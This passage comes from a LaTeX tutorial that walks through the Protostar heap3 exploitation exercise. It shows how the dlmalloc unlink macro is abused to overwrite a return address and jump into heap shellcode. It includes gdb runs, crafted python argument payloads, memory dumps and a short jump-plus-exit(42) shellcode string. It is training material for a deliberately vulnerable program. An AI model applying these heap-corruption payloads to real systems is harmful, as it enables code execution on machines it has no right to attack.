0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x00000000
0x804c060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
\end{lstlisting}

Alright, so we can clearly control this arbitrary memory write with precision. Now,
how do we exploit this? What do we overwrite to exploit the program? In reality,
this may heavily depend on the target program. In some cases we may only want
to flip a bit to set a flag or change some other variable in memory, but
a more devastating option is to redirect execution. While we could
potentially overwrite any function pointer in writeable memory (.dtors, .got, etc...)
a more familiar option would be to overwrite the return address on the stack.
Now that we have our target, we need to pick what to set it to.
Because this must also be an address in writeable memory, we have some restrictions.
For example, we can't redirect execution to some function in .data because it's
read-only. Redirecting to some library function in the Global Offset Table (.got)
could be possible, but we'd normally have to set up variables on the stack
to do anything useful with that. Instead, we'll redirect execution back
into the heap, which is mapped as both writeable and executable.\\

%TODO: insert objdump/readelf/whatever output here to show this is true

First, we'll find our return address. This is similar to the stack portion, where
we simply breakpoint somewhere in main, then examine the stack to determine where
this is. Because various bits of libc code are executed before we even get to
\texttt{main}, we need to remember that changing number and size of arguments
given to the program can change precisely where \texttt{main}'s stack is. Since we
want to redirect execution to the heap, we'll fill chunk \texttt{c} with bytes,
as if we put shellcode there. That way the return address location we determine 
won't change once we move from overwriting it to developing the payload shellcode.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x04\xc0\x04\x08"+"\x5c\xc0\x04\x08")'` `python -c 'print("\x90"*32)'`
Breakpoint 12, 0x080488d2 in main (argc=4, argv=0xbffff804) at heap3/heap3.c:20
20      in heap3/heap3.c
(gdb) x/16x $ebp
0xbffff758:     0xbffff7d8      0xb7eadc76      0x00000004      0xbffff804
0xbffff768:     0xbffff818      0xb7fe1848      0xbffff7c0      0xffffffff
0xbffff778:     0xb7ffeff4      0x08048576      0x00000001      0xbffff7c0
0xbffff788:     0xb7ff0626      0xb7fffab0      0xb7fe1b28      0xb7fd7ff4
\end{lstlisting}

Here we see \texttt{argc} (0x00000004), and know that at this point the return
address is at \texttt{ebp + 0x4}, so our return address is the \texttt{0xb7eadc76}
at \texttt{0xbffff75c}. So, we'll want to set \texttt{FD} to \texttt{0xbffff750}.
To redirect to chunk \texttt{c}, we'll set \texttt{BK} to \texttt{0x0804c058}.
Let's try it.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\xf0"*4+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\x90"*32)'`
dynamite failed?

Program received signal SIGFPE, Arithmetic exception.
0x0804c065 in ?? ()
(gdb) x/16x 0x0804c050
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x90909090
0x804c060:      0x90909090      0xbffff750      0x90909090      0x90909090
0x804c070:      0x90909090      0x90909090      0x00000000      0x00000f89
0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
\end{lstlisting}

Excellent! We filled chunk \texttt{c} with NOPs, but any non-null value would've worked.
As we can see, we crash with a SIGFPE exception at \texttt{0x0804c065}. This address is
on the heap, just a few bytes after the beginning of chunk \texttt{c}. Then, we examine
chunk \texttt{c} to see exactly what happened. Our NOPs were loaded (and executed) just
fine, but trouble starts where we crashed (imagine that). Our NOP sled was corrupted
by \texttt{0xbffff750}, the very address we overwrote! Here we encounter one of the
final hurdles to succesfull exploitation. Because we used the unlink macro, it will
perform two writes, one of which will always be in our shellcode (assuming that's what
we're redirecting execution to). No matter what we do, we'll have 4 bytes of our shellcode,
starting either 8 bytes in or 12 bytes in, clobbered. We could write our shellcode
here after the arbitrary memory write in \texttt{unlink}, but this simply isn't
an option in this situation. Instead, we'll have to modify the shellcode to
short-jump over this corruption, or perform some other trick so we at least
don't crash.\\

The shellcode we're using is essentially the \texttt{exit(42)} shellcode from earlier,
but with a short jump in the beginning, and some unused bytes between it and the
main portion of the shellcode. Also, we have to consider that as part
of the frees that occur, the first 4 bytes of chunk \texttt{c} will be zeroed, and
we want to maintain filling chunk \texttt{c} with exactly 32 bytes. That way we
don't have to go back and re-find the return address' location on the stack.
Skipping over the details of assembly programming and dumping the bytecode,
we have the following escaped-byte string which will serve as our shellcode.
\begin{lstlisting}
"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"
\end{lstlisting}
%TODO: should explain this a little better, reference shellcode section

The large stream of \texttt{0x90} bytes is simply so we can be sure our short jump
will indeed jump over the corruption from \texttt{unlink}. We'll wind up having
more bytes here than strictly necessary, but we're still well within the limits on
our chunk. Also, since this is 24 bytes long, and we'll pad with 4 bytes in the beginning,
we'll pad with 4 bytes on the end of this to satisfy filling chunk \texttt{c} with
32 bytes (24 + 4 + 4 = 32). Alright, let's set up this last portion of our
buffer and try it out.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\xf0"*4+"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"+"\x90"*4)'`
Breakpoint 1, main (argc=4, argv=0xbffff804) at heap3/heap3.c:24
24      heap3/heap3.c: No such file or directory.
        in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0x41414141      0xfffffffc      0xfffffffc
0x804c030:      0x0804c004      0xbffff750      0x0804c05c      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000029      0xf0f0f0f0      0x90900ceb
0x804c060:      0x90909090      0x90909090      0xc0319090      0x2ab3db31
0x804c070:      0x80cd01b0      0x90909090      0x00000000      0x00000f89
(gdb) c
Continuing.

Breakpoint 2, main (argc=4, argv=0xbffff804) at heap3/heap3.c:26
26      in heap3/heap3.c
(gdb) x/32x 0x0804c000
0x804c000:      0x00000000      0x00000029      0x41414141      0x41414141
0x804c010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804c020:      0x41414141      0xfffffff8      0xfffffffc      0xfffffffc
0x804c030:      0xfffffff9      0x0804b194      0x0804b194      0x00000000
0x804c040:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c050:      0x00000000      0x00000fb1      0x00000000      0x90900ceb
0x804c060:      0x90909090      0xbffff750      0xc0319090      0x2ab3db31
0x804c070:      0x80cd01b0      0x90909090      0x00000000      0x00000f89
(gdb) c
Continuing.
dynamite failed?

Program exited with code 052.
(gdb) print 052
$1 = 42
\end{lstlisting}

Here, I added two breakpoints to watch both precisely how my buffer is initially
placed in memory, and then how it's affected immediately after the
\texttt{unlink} macro is executed. We can see our \texttt{0xf0f0f0f0} was
overwritten with null bytes, but more importantly, we see that the
4 bytes of our shellcode starting at \texttt{0804c064} were clobbered
during the \texttt{unlink}. Continuing execution, we see that we
exit with status 052 in octal, which is 42 in decimal, demonstrating that
we now have code execution. Just to be clear, we can exploit the program again,
after having placed a breakpoint at main's return instruction, then
instruction-stepping into our shellcode.

\begin{lstlisting}
(gdb) r `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x50\xf7\xff\xbf"+"\x5c\xc0\x04\x08")'` `python -c 'print("\xf0"*4+"\xeb\x0c\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb3\x2a\xb0\x01\xcd\x80"+"\x90"*4)'`

Breakpoint 3, 0x0804893b in main (argc=134514825, argv=0x4) at heap3/heap3.c:29
29      in heap3/heap3.c
(gdb) si
0x0804c05c in ?? ()
(gdb) x/i 0x0804c05c
0x804c05c:      jmp    0x804c06a
(gdb) x/10i 0x0804c06a
0x804c06a:      xor    %eax,%eax
0x804c06c:      xor    %ebx,%ebx
0x804c06e:      mov    $0x2a,%bl
0x804c070:      mov    $0x1,%al
0x804c072:      int    $0x80
0x804c074:      nop
0x804c075:      nop
0x804c076:      nop
0x804c077:      nop
0x804c078:      add    %al,(%eax)
(gdb) c
Continuing.
dynamite failed?

Program exited with code 052.
\end{lstlisting}

We can plainly see that we jump to our shellcode. What we also notice
is that our shellcode performs a short (relative) jump to the standard
\texttt{exit(42)} shellcode from before. To fully complete the challenge,
we want to call the \texttt{winner} function, then clean up after ourselves
so that the program can exit normally. This is left as an excercise for the
reader.
% /opt/protostar/bin/heap3 `python -c 'print("A"*32 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff")'` `python -c 'print("\x04\xc0\x04\x08"+"\x40\xf7\xff\xbf"+"\x5c\xc0\x04\x08"+"\x04\xc0\x04\x08"*5)'` `python -c 'print("\x90"*32)'`

